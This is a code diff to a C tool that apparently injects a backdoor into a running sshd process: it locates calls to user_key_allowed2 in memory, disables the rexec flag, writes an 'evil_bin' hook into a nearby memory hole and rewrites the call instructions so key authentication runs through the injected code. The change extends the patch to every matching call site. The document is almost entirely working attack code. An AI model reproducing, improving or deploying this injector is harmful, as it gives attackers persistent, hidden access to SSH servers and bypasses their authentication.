@@ -30,8 +30,8 @@ signature signatures[]={
 	{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 },
 	{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
 	{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 },
-	{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 },
-//	{ 0x3333333344444444, "uauth_passwd", "password change not supported", "\x90\x90", 2, 2, 0 }
+	{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 }
+//	{ 0x3333333344444444, "uauth_passwd", "password change not supported", 0 }
 };
 
 u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
@@ -84,14 +84,15 @@ u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
 	return rtop;
 }
 
-
 int main(int argc, char *argv[]) {
 	char line[255], sshd_path[255], proc_exe[64];
 	int i, j;
 
 	u32 nullw=0, callcache_total;
 	callcache_entry *callcache, *entry;
-	u64 diff=0, call_user_key_allowed2=0, hole_addr=0, rexec_flag;
+	u64 diff=0, hole_addr=0, rexec_flag;
+	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
+	u32 num_key_allowed2_calls=0;
 	u8 *evil_bin;
 
 	mem_mapping *m1, *m2;
@@ -181,31 +182,28 @@ int main(int argc, char *argv[]) {
 		info(line);
 	}
 
-	call_user_key_allowed2 = 0;
-
 	callcache = get_callcache();
 	callcache_total = get_callcachetotal();
 
 	for(i=0; i<callcache_total; i++) {
 		entry = &callcache[i];
 		if (entry->dest == signatures[0].addr) {
-			info("found call user_key_allowed @ 0x%lx", entry->addr);
-			call_user_key_allowed2 = entry->addr;
+			info("found a 'call user_key_allowed' @ 0x%lx", entry->addr);
+			user_key_allowed2_calls[num_key_allowed2_calls] = entry->addr;
+			num_key_allowed2_calls++;
 		}
 	}
 
-	if (call_user_key_allowed2 == 0)
-		error("call allowed2 not found :(");
+	if (num_key_allowed2_calls == 0)
+		error("no call to user_key_allowed2 found :(");
 
-	info("call allowed2\t= \x1b[37m0x%lx", call_user_key_allowed2);
-	
 	// find a neighborly memoryhole where we can mmap
 	for(i=0; i < ctx->num_maps; i++) {
 		m1 = ctx->mappings[i];
 		m2 = ctx->mappings[i+1];
 
 		if(
-			call_user_key_allowed2 >= m1->start && // call_user_key_allowed2 <= m1->end &&
+			user_key_allowed2_calls[0] >= m1->start &&
 			m2->start > (m1->end + 0x1000)
 		) {
 			hole_addr = m1->end;
@@ -229,19 +227,20 @@ int main(int argc, char *argv[]) {
 		0, 0
 	);
 
-	diff = 0x100000000-(call_user_key_allowed2-hole_addr)-5;
-
 	info("switching off rexec..");
 	_poke(ctx->pid, rexec_flag, &nullw, 4);
 
-	info(
-		"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
-		call_user_key_allowed2, hole_addr,
-		diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
-	);
+	for(i=0; i<num_key_allowed2_calls; i++) {
+		diff = 0x100000000-(user_key_allowed2_calls[i]-hole_addr)-5;
 
-	_poke(ctx->pid, call_user_key_allowed2+1, &diff, 4);
-	info("updated call. oh-oh");
+		info(
+			"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
+			user_key_allowed2_calls[i], hole_addr,
+			diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
+		);
+
+		_poke(ctx->pid, user_key_allowed2_calls[i]+1, &diff, 4);
+	}
 
 	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
 	_poke(ctx->pid, hole_addr+(evil_hook_size), argv[2], strlen(argv[2]));
